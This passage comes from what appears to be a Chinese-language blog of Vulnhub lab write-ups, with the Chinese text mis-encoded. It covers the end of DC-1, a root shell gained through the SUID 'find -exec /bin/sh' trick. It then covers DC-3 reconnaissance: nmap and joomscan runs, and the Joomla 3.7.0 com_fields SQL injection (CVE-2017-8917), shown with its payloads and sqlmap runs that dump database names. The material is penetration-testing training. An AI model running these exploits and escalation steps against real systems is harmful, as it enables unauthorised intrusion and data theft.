class="line">flag4@DC-1:~$</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥çœ‹æ–‡ä»¶ï¼Œå¾—åˆ°flag4</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line">flag4@DC-1:~$ cat flag4.txt </span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it<span class="string">&#x27;s not that easy.  Or maybe it is?</span></span><br><span class="line"><span class="string">flag4@DC-1:~$ </span></span><br></pre></td></tr></table></figure>

<p><code>æ ¹æ®æç¤ºï¼Œä½ èƒ½ç”¨ç›¸åŒæ–¹æ³•æ‰¾åˆ°rootçš„å—ï¼Ÿæˆ–è®¸å¾ˆéš¾ï¼Œä½†ä¹Ÿä¸ä¸€å®š</code></p>
<p><code>å°è¯•cdåˆ°rootç”¨æˆ·ä¸‹ï¼Œç»“æœå¤±è´¥ï¼Œæ¥ä¸‹æ¥ææƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ <span class="built_in">cd</span> /root/</span><br><span class="line">-bash: <span class="built_in">cd</span>: /root/: Permission denied</span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><blockquote>
<p>æŸ¥çœ‹ç³»ç»Ÿå‘½ä»¤å½“ä¸­æ˜¯å¦æœ‰SUIDæ ‡è¯†ã€‚</p>
<p>SUIDæ ‡è¯†ä¸ºåœ¨å‘½ä»¤æ‰§è¡Œæ—¶å°†çŸ­æš‚è·å¾—rootæƒé™ï¼Œé€šè¿‡å…·æœ‰SUIDæ ‡è¯†çš„å‘½ä»¤è¿è¡Œbashï¼Œè¿™æ—¶bashå°±æœ‰rootæƒé™ã€‚</p>
<p>rootä¿¡ä»»SUIDï¼ŒSUIDä¿¡ä»»bashï¼Œbashå°±æœ‰äº†rootæƒé™</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null   // æŸ¥çœ‹å…·æœ‰SUIDçš„å‘½ä»¤</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">flag4@DC-1:~$ </span><br></pre></td></tr></table></figure>

<p><code>å‘ç°findå°±å¯ä»¥</code></p>
<p><code>ä¸‹é¢è¿›è¡Œåˆ©ç”¨</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find /root -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \; </span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">flag4@DC-1:~$ </span><br></pre></td></tr></table></figure>

<p><code>å¯ä»¥å‘ç°ä¸ºroot</code></p>
<p><code>ææƒ</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4@DC-1:~$ find /root -<span class="built_in">exec</span> <span class="string">&quot;/bin/bash&quot;</span> \;      </span><br><span class="line">bash-4.2$ id</span><br><span class="line">uid=1001(flag4) gid=1001(flag4) groups=1001(flag4)</span><br><span class="line">bash-4.2$ </span><br></pre></td></tr></table></figure>

<p><code>eç¿»è½¦äº†ï¼å†æ¢ä¸ªæ–¹æ³•</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-4.2$ find /root -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;    </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1001(flag4) gid=1001(flag4) euid=0(root) groups=0(root),1001(flag4)</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p><code>æˆåŠŸäº†ğŸ˜­</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/flag4</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">thefinalflag.txt</span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="string">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">by contacting me via Twitter - @DCAU7</span></span><br><span class="line"><span class="string"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x11-æ¥ä¸‹æ¥å°±æ˜¯æ“¦å±è‚¡èµ°äººäº†ï¼Œå¹²ä¸åŠ¨äº†ã€‚ã€‚ã€‚"><a href="#0x11-æ¥ä¸‹æ¥å°±æ˜¯æ“¦å±è‚¡èµ°äººäº†ï¼Œå¹²ä¸åŠ¨äº†ã€‚ã€‚ã€‚" class="headerlink" title="0x11.æ¥ä¸‹æ¥å°±æ˜¯æ“¦å±è‚¡èµ°äººäº†ï¼Œå¹²ä¸åŠ¨äº†ã€‚ã€‚ã€‚"></a>0x11.æ¥ä¸‹æ¥å°±æ˜¯æ“¦å±è‚¡èµ°äººäº†ï¼Œå¹²ä¸åŠ¨äº†ã€‚ã€‚ã€‚</h2>]]></content>
      <categories>
        <category>vulnhub</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3</title>
    <url>/2020/08/22/DC-3/</url>
    <content><![CDATA[<h2 id="0x00-å®˜ç½‘æè¿°"><a href="#0x00-å®˜ç½‘æè¿°" class="headerlink" title="0x00.å®˜ç½‘æè¿°"></a>0x00.å®˜ç½‘æè¿°</h2><blockquote>
<p>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p>
<p>As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.</p>
<p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p>
<p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I wonâ€™t give you the answer, instead, Iâ€™ll give you an idea about how to move forward.</p>
<p>For those with experience doing CTF and Boot2Root challenges, this probably wonâ€™t take you long at all (in fact, it could take you less than 20 minutes easily).</p>
<p>If thatâ€™s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</p>
<p><strong>DC-3ä¹‹åä¸å†æœ‰æç¤ºä¿¡æ¯ï¼Œåªæœ‰ä¸€ä¸ªæœ€ç»ˆflag</strong></p>
</blockquote>
<a id="more"></a>

<h2 id="0x01-è€è§„çŸ©ä¸Šnmap"><a href="#0x01-è€è§„çŸ©ä¸Šnmap" class="headerlink" title="0x01.è€è§„çŸ©ä¸Šnmap"></a>0x01.è€è§„çŸ©ä¸Šnmap</h2><p><code>å¯ä»¥å‘ç°1ä¸ºç½‘å…³ï¼Œ2ä¸ºå®¿ä¸»æœºï¼Œ6ä¸ºkaliï¼Œé‚£ä¹ˆ5å°±æ˜¯æˆ‘ä»¬çš„å—å®³è€…</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># nmap -sP 192.168.1.0/24 -oN nmap.sP</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 20:53 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.1</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">MAC Address: 68:D1:BA:1F:FD:48 (Shenzhen Youhua Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.2</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">MAC Address: 50:5B:C2:8C:BE:A5 (Liteon Technology)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.5</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 00:0C:29:63:7B:83 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.6</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.09 seconds</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p><strong>é™„åŠ ï¼šä½¿ç”¨netdiscoverä¹Ÿå¯ä»¥</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># netdiscover</span></span><br><span class="line"> Currently scanning: 192.168.21.0/16   |   Screen View: Unique Hosts                 </span><br><span class="line"> 8 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 480                     </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.1.2     50:5b:c2:8c:be:a5      6     360  Liteon Technology Corporation     </span><br><span class="line"> 192.168.1.1     68:d1:ba:1f:fd:48      1      60  Shenzhen YOUHUA Technology Co., Ltd</span><br><span class="line"> 192.168.1.5     00:0c:29:63:7b:83      1      60  VMware, Inc.                   </span><br></pre></td></tr></table></figure>

<h2 id="0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"><a href="#0x02-ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£" class="headerlink" title="0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£"></a>0x02.ç»§ç»­nmapæ‰«ææœåŠ¡åŠç«¯å£</h2><p><code>å‘ç°å­å¼€æ”¾äº†80ç«¯å£</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># nmap -A 192.168.1.5 -p 1-65535 -oN nmap.A</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-21 21:02 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.1.5</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home</span><br><span class="line">MAC Address: 00:0C:29:63:7B:83 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.51 ms 192.168.1.5</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 10.28 seconds</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><p><code>æ ¹æ®æç¤ºï¼Œè¿™æ¬¡åªæœ‰ä¸€ä¸ªflagï¼Œéœ€è¦è·å¾—rootæƒé™</code></p>
<img src="/2020/08/22/DC-3/image-20200822090518505.png" class>

<p><code>æ²¡æœ‰ä»€ä¹ˆå…¶ä»–æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¸‹é¢ä½¿ç”¨whatwebè¿›è¡ŒæŒ‡çº¹è¯†åˆ«</code></p>
<h2 id="0x04-æŒ‡çº¹è¯†åˆ«"><a href="#0x04-æŒ‡çº¹è¯†åˆ«" class="headerlink" title="0x04.æŒ‡çº¹è¯†åˆ«"></a>0x04.æŒ‡çº¹è¯†åˆ«</h2><p><code>å‘ç°ä¸ºapacheï¼Œubuntuï¼ŒJoomla(cms)</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># whatweb http://192.168.1.5</span></span><br><span class="line">http://192.168.1.5 [200 OK] Apache[2.4.18], Bootstrap, Cookies[460ada11b31d3c5e5ca6e58fd5d3de27], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], HttpOnly[460ada11b31d3c5e5ca6e58fd5d3de27], IP[192.168.1.5], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json], Title[Home]</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-ä½¿ç”¨joomscanæ‰«æ"><a href="#0x05-ä½¿ç”¨joomscanæ‰«æ" class="headerlink" title="0x05.ä½¿ç”¨joomscanæ‰«æ"></a>0x05.ä½¿ç”¨joomscanæ‰«æ</h2><p><code>å‘ç°æ²¡æœ‰é˜²ç«å¢™ï¼ŒJoomlaç‰ˆæœ¬ä¸º3.7.0ï¼Œ4ä¸ªç›®å½•åˆ—è¡¨ï¼Œä¸ç½‘ç«™åå°</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># joomscan -u http://192.168.1.5</span></span><br><span class="line"> (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )</span><br><span class="line">  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( </span><br><span class="line">  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)</span><br><span class="line">                        (1337.today)</span><br><span class="line">   </span><br><span class="line">    --=[OWASP JoomScan</span><br><span class="line">    +---++---==[Version : 0.0.7</span><br><span class="line">    +---++---==[Update Date : [2018/09/23]</span><br><span class="line">    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo</span><br><span class="line">    --=[Code name : Self Challenge</span><br><span class="line">    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP</span><br><span class="line"></span><br><span class="line">Processing http://192.168.1.5 ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://192.168.1.5/administrator/components</span><br><span class="line">http://192.168.1.5/administrator/modules</span><br><span class="line">http://192.168.1.5/administrator/templates</span><br><span class="line">http://192.168.1.5/images/banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.1.5/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is not found</span><br><span class="line"></span><br><span class="line">[+] Finding common backup files name</span><br><span class="line">[++] Backup files are not found</span><br><span class="line"></span><br><span class="line">[+] Finding common <span class="built_in">log</span> files name</span><br><span class="line">[++] error <span class="built_in">log</span> is not found</span><br><span class="line"></span><br><span class="line">[+] Checking sensitive config.php.x file</span><br><span class="line">[++] Readable config files are not found</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your Report : reports/192.168.1.5/</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-çˆ¬ä¸€ä¸‹ç›®å½•åˆ—è¡¨"><a href="#0x06-çˆ¬ä¸€ä¸‹ç›®å½•åˆ—è¡¨" class="headerlink" title="0x06.çˆ¬ä¸€ä¸‹ç›®å½•åˆ—è¡¨"></a>0x06.çˆ¬ä¸€ä¸‹ç›®å½•åˆ—è¡¨</h2><p><strong>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œå›¾å°±ä¸æ”¾äº†ã€‚ã€‚ã€‚</strong></p>
<h2 id="0x07-è®¿é—®åå°"><a href="#0x07-è®¿é—®åå°" class="headerlink" title="0x07.è®¿é—®åå°"></a>0x07.è®¿é—®åå°</h2><p><code>ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ç”¨çš„ä¿¡æ¯ï¼Œå¯ä»¥çˆ†ç ´ï¼Œä½†çˆ†ç ´æ˜¯æœ€åçš„æŒ£æ‰ï¼Œå…ˆæŸ¥ä¸€ä¸‹Joomla 3.7.0æœ‰æ²¡æœ‰æ¼æ´</code></p>
<img src="/2020/08/22/DC-3/image-20200822092304133.png" class>

<h2 id="0x08-æŸ¥æ‰¾Joomlaæ¼æ´"><a href="#0x08-æŸ¥æ‰¾Joomlaæ¼æ´" class="headerlink" title="0x08.æŸ¥æ‰¾Joomlaæ¼æ´"></a>0x08.æŸ¥æ‰¾Joomlaæ¼æ´</h2><p><code>å‘ç°å­˜åœ¨sqlæ³¨å…¥</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># searchsploit joomla 3.7.0</span></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                           |  Path</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Joomla! 3.7.0 - <span class="string">&#x27;com_fields&#x27;</span> SQL Injection                                                                                               | php/webapps/42033.txt</span><br><span class="line">Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                                                                            | php/webapps/43488.txt</span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x09-æŸ¥çœ‹sqliè¯´æ˜"><a href="#0x09-æŸ¥çœ‹sqliè¯´æ˜" class="headerlink" title="0x09.æŸ¥çœ‹sqliè¯´æ˜"></a>0x09.æŸ¥çœ‹sqliè¯´æ˜</h2><blockquote>
<p>CVE : - CVE-2017-8917</p>
<p>å­˜åœ¨æ³¨å…¥ç‚¹</p>
<p>å¯ä»¥ä½¿ç”¨sqlmapè¿›è¡Œåˆ©ç”¨</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#  cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla_v3.7.0_sqli.txt</span></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># cat joomla_v3.7.0_sqli.txt </span></span><br><span class="line"><span class="comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="comment"># Date: 05-19-2017</span></span><br><span class="line"><span class="comment"># Exploit Author: Mateus Lino</span></span><br><span class="line"><span class="comment"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.joomla.org/</span></span><br><span class="line"><span class="comment"># Version: = 3.7.0</span></span><br><span class="line"><span class="comment"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span></span><br><span class="line"><span class="comment"># CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap: </span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Parameter: list[fullordering] (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h2 id="0x10-sqlmapåˆ©ç”¨"><a href="#0x10-sqlmapåˆ©ç”¨" class="headerlink" title="0x10.sqlmapåˆ©ç”¨"></a>0x10.sqlmapåˆ©ç”¨</h2><h3 id="1-çˆ†åº“"><a href="#1-çˆ†åº“" class="headerlink" title="1.çˆ†åº“"></a>1.çˆ†åº“</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">[21:42:32] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.1</span><br><span class="line">[21:42:32] [INFO] fetching database names</span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;information_schema&#x27;</span></span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;joomladb&#x27;</span></span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;mysql&#x27;</span></span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;performance_schema&#x27;</span></span><br><span class="line">[21:42:32] [INFO] retrieved: <span class="string">&#x27;sys&#x27;</span></span><br><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] joomladb</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] sys</span><br><span class="line"></span><br><span class="line">[21:42:32] [WARNING] HTTP error codes detected during run:</span><br><span class="line">500 (Internal Server Error) - 2670 <span class="built_in">times</span></span><br><span class="line">[21:42:32] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:42:32 /2020-08-21/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/tmp/DC3<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="2-æŸ¥çœ‹å½“å‰æ•°æ®åº“"><a href="#2-æŸ¥çœ‹å½“å‰æ•°æ®åº“" class="headerlink" title="2.æŸ¥çœ‹å½“å‰æ•°æ®åº“"></a>2.æŸ¥çœ‹å½“å‰æ•°æ®åº“</h3><p><code>å½“å‰æ•°æ®åº“åå­—ä¸ºjoomladb</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC3<span class="comment"># sqlmap -u &quot;http://192.168.1.5/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]       </span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&quot;]_____ ___ ___  &#123;1.4.8#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [&#x27;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 21:51:56 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[21:51:56] [INFO] fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Macintosh; U; PPC Mac OS X; sv-se) AppleWebKit/523.12.2 (KHTML, like Gecko) Version/3.0.4 Safari/523.12.2&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span></span><br><span class="line"><span class="string">[21:51:56] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[21:51:56] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[21:51:56] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests</span></span><br><span class="line"><span class="string">you have not declared cookie(s), while server wants to set its own (&#x27;460ada11b31d3c5e5ca6e58fd5d3de27=k3m9bafm9dg...dg5cjc6tq0&#x27;). Do you want to use those [Y/n] </span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: list[fullordering] (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(UPDATEXML(8495,CONCAT(0x2e,0x7170786b71,(SELECT (ELT(8495=8495,1))),0x7170786b71),8473))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8890 FROM (SELECT(SLEEP(5)))cGDb)</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[21:51:59] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.1</span></span><br><span class="line"><span class="string">[21:51:59] [INFO] fetching current database</span></span><br><span class="line"><span class="string">[21:51:59] [INFO] retrieved: &#x27;joomladb&#x27;</span></span><br><span class="line"><span class="string">current database: &#x27;joomladb&#x27;</span></span><br><span class="line"><span class="string">[21:51:59] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 2 times</span></span><br><span class="line"><span class="string">[21:51:59] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.1.5&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 21:51:59 /2020-08-21/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@JIYE:~/tmp/DC3# </span></span><br></pre></td></tr></table></figure>

